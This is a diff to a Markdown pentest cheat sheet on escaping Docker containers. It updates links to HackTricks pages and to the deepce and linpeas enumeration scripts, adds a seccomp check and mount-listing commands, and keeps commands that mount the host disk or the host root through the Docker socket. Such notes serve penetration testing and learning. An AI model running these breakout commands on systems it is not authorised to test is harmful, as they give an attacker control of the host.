@@ -2,13 +2,14 @@
 
 ## 📚 Resources
 
-- [hacktricks](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation/index.html) - Docker breakout PE
-- [excessive-capabilities](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities) - Capabilities exploits
+- [hacktricks](https://blog.1nf1n1ty.team/hacktricks/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation)
+- [hacktricks - container security](https://hacktricks.wiki/en/linux-hardening/privilege-escalation/container-security/index.html)
+- [Excessive Capabilities](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities)
 
 ### ⛓️‍💥 Tools for breakout
 
 - [deepce.sh](https://raw.githubusercontent.com/stealthcopter/deepce/main/deepce.sh) - script for docker breakout
-- [linpeas.sh](http://linpeas.sh)
+- [linpeas.sh](https://github.com/peass-ng/PEASS-ng/releases/download/20260409-8e8610f2/linpeas.sh)
 
 ### 📌 Tips
 
@@ -41,9 +42,18 @@ capsh --print
 
 ### Mounted host files `--privileged`
 
+To check if the container has a privileged right, the output of this command can be `0`, if output is `1` or `2` the container hasn't privileged.
+
+```bash
+cat /proc/1/status | grep -i "seccomp"
+```
+
+Check if file are mounted.
+
 ```bash
 lsblk -f
 fdisk -l
+df -h
 findmnt
 
 mkdir /mnt/host
@@ -70,7 +80,7 @@ export DOCKER_HOST=unix:///run/docker.sock
 ```bash
 # use socket via DOCKER_HOST env
 docker ps -a
-docker run -v /:/mnt --rm -it alpine sh # enter in host
+docker run -v /:/mnt --rm -it alpine sh
 ```
 
 ```bash
